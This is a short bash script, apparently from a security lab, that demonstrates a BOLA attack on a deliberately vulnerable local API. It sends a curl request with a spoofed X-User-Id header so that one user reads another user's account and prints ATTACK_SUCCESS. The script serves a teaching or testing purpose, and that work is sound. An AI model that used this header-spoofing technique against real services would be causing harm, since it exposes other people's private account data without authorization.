#!/bin/bash
# Ataque BOLA — Estado VULNERABLE — Acceso directo por ID
# Bob (userId=2) accede a la cuenta de Alice (accountId=1)

echo "=== BOLA Vulnerable: Acceso directo ==="
echo "Bob (user 2) intenta ver la cuenta #1 (de Alice):"
echo ""

curl -s -H "X-User-Id: 2" \
  http://localhost:8080/api/bola/vulnerable/accounts/1 | python -m json.tool

echo ""
echo "Resultado esperado: ATTACK_SUCCESS (datos de Alice visibles)"
